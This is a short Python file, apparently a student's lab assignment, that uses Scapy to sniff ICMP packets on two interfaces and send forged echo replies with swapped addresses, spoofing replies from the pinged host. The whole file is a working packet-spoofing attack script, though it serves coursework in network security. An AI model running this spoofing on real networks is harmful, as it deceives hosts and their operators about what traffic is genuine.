from scapy.all import *

# as the hint in the assigment suggests we ran the cmd ip route get X
# we found out each arttibute in the args

_ip = 1
_icmp = 2
_raw = 3


def spoofing(pkt):
    ip_obj =IP()
    ip_obj.src = pkt[_ip].dst
    ip_obj.dst = pkt[_ip].src
    ip_obj.ihl = pkt[_ip].ihl
    icmp_obj = ICMP()
    icmp_obj.type = 0
    icmp_obj.id = pkt[_icmp].id
    icmp_obj.seq = pkt[_icmp].seq
    data = pkt[_raw].load

    spoofed_pkt = ip_obj/icmp_obj/data
    send(spoofed_pkt,verbose = 0)

    print("spoofed packet sent")

#todo run all the 3 scenarios with wireshark (capture and save) and explain each one of them in pdf  

list_of_sniffing = ['br-3d50edc4535c','enp0s3']
pkt = sniff(iface = list_of_sniffing,filter = 'icmp',prn = spoofing)


